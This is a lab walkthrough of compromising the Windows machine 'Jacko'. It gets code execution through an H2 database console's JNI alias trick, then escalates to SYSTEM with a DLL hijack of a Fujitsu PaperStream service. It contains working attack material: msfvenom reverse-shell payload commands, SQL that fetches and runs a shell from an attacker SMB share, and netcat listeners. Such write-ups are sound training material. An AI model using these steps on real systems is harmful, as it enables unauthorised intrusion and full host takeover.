#Windows #H2Database #JNI #RCE #msfvenom #DLLHijack #CVE #PrivEsc

## Overview

Jacko is a Windows machine that starts with an exposed **H2 database console** and ends with a **DLL hijack** against a vendor scanning service. The foothold abuses a known H2 1.4.199 JNI code-execution trick to run commands as a low-privileged user, and the escalation swaps a malicious DLL into the search path of `FJTWSVIC`, a Fujitsu PaperStream service that runs as `LocalSystem`. It's a clean lesson in how third-party software installed on a host becomes the weakest link.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0 (H2 Database Engine redirect)
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8082/tcp open  http          H2 database http console
```

Two web ports both point at **H2**, a Java SQL database. Port 80 just redirects, but `8082` is the live H2 web console, that's the attack surface.

### Web Enumeration

A directory scan of port 80 only turned up H2's own documentation folders (`/html`, `/javadoc`, `/help`), confirming there's nothing custom here, the database itself is the target:

```sh
gobuster dir -u http://192.168.176.66 -w .../big.txt
/javadoc  (301)   /html  (301)   /help  (301)   /images  (301)
```

## Foothold

### H2 Console → JNI Code Execution

The H2 console lets you connect to a database with no real authentication, and once connected you can issue SQL. Searchsploit flagged the exact version as exploitable:

```sh
searchsploit H2 1.4.199
H2 Database 1.4.199 - JNI Code Execution | java/local/49384.txt
```

> **How the H2 JNI trick works:** H2 is written in Java, and it lets you define a SQL `ALIAS` backed by a Java method. The exploit registers an alias pointing at `JNIScriptEngine.eval`, then calls it with a string of Java that runs `Runtime.getRuntime().exec(...)`. So a SQL statement becomes arbitrary Java, which becomes an OS command. No memory corruption, just a database feature working exactly as designed against you.

Following the PoC gave command execution as `jacko\tony`. To turn that into a shell, I generated a reverse-shell exe and served it from an Impacket SMB share:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.167 LPORT=8082 -f exe -a x64 --platform windows -o shell.exe
impacket-smbserver -smb2support evil $PWD
```

Then I re-used the JNI alias, this time pulling and executing the payload straight off the SMB share:

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("//192.168.45.167/evil/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```

```sh
rlwrap nc -lvnp 8082
connect to [...] from [...]
C:\Program Files (x86)\H2\service>whoami
'whoami' is not recognized as an internal or external command
```

> **A small but common snag:** the shell inherited an empty `PATH`, so even built-ins like `whoami` failed. Rebuilding `PATH` to include `System32` fixes it without needing a new shell:

```powershell
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
C:\Program Files (x86)\H2\service>whoami
jacko\tony
```

That's the user flag:

```powershell
C:\Users\tony\Desktop> type local.txt
‹redacted›
```

## Privilege Escalation

### Finding the Vulnerable Service

Listing `Program Files` turned up a non-standard application, `fiScanner` (Fujitsu PaperStream). Searching that product name for privesc bugs led to:

```
PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation
A DLL hijack vulnerability exists in the FJTWSVIC service
```

The first thing to verify is that the service exists and runs with high privilege:

```powershell
C:\>sc qc FJTWSVIC
SERVICE_NAME: FJTWSVIC
        TYPE               : 10  WIN32_OWN_PROCESS
        BINARY_PATH_NAME   : C:\Windows\twain_32\Fjicube\FJTWSVIC.exe
        SERVICE_START_NAME : LocalSystem
```

Two details decide the attack:

- `SERVICE_START_NAME : LocalSystem`, the service runs as `SYSTEM`, so hijacking it yields full privilege.
- `TYPE : 10 WIN32_OWN_PROCESS` on this build is a 32-bit service, so my malicious DLL must be **x86**, not x64.

> **What a DLL hijack is:** when a program loads a DLL by name without a fully-qualified path, Windows searches a fixed list of directories in order. If an attacker can drop a DLL earlier in that search order than the legitimate one, the privileged service loads the attacker's code instead. Here the PaperStream service looks for a DLL in a location `tony` can write to.

### Hijacking FJTWSVIC

I built a 32-bit reverse-shell DLL and grabbed the exploit's PowerShell wrapper, which copies the payload into the writable location the service checks and triggers the load:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 -f dll -a x86 --platform windows -o UninOldIs.dll
searchsploit -m 49382
```

```powershell
PS C:\Users\Tony\Desktop> .\exploit.ps1
Writable location found, copying payload to C:\JavaTemp\
Payload copied, triggering...
```

## Root / SYSTEM

The service loaded the planted DLL and connected back as `SYSTEM`:

```powershell
rlwrap nc -lvnp 80
connect to [...] from [...]
C:\Windows\system32>whoami
nt authority\system
```

Box rooted:

```powershell
C:\Users\Administrator\Desktop>type proof.txt
‹redacted›
```

## Takeaways

- **Exposed admin/database consoles are gold.** H2's console plus a known JNI alias trick gave code execution with no credentials.
- **Mind the architecture.** A 32-bit service needs a 32-bit DLL, matching `msfvenom -a x86` to `TYPE : 10` is what made the hijack fire.
- **Third-party software is the soft underbelly of Windows privesc.** Enumerate non-default `Program Files` entries and `sc qc` every unfamiliar service; one that runs as `LocalSystem` and loads a DLL from a writable path is an instant `SYSTEM`.
